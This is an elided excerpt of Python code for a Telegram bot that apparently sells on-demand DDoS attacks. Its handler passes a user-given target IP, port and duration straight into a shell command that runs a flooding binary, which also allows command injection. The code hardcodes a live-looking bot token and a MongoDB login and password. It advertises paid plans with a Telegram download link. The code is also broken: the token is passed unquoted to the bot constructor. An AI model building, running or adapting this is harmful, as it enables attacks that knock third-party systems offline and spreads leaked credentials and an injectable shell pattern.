...
TOKEN = '8212059188:AAGZI9YKGTZDV-IdyvzHL5PG3dywIwDm3XE'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@LSR.tsga4.mongodb.net'
...
bot = telebot.TeleBot(8212059188:AAGZI9YKGTZDV-IdyvzHL5PG3dywIwDm3XE)
REQUEST_INTERVAL = 1
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./LSR_DDOS {target_ip} {target_port} {duration} 10")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/LSR_DDOS*", parse_mode='Markdown')
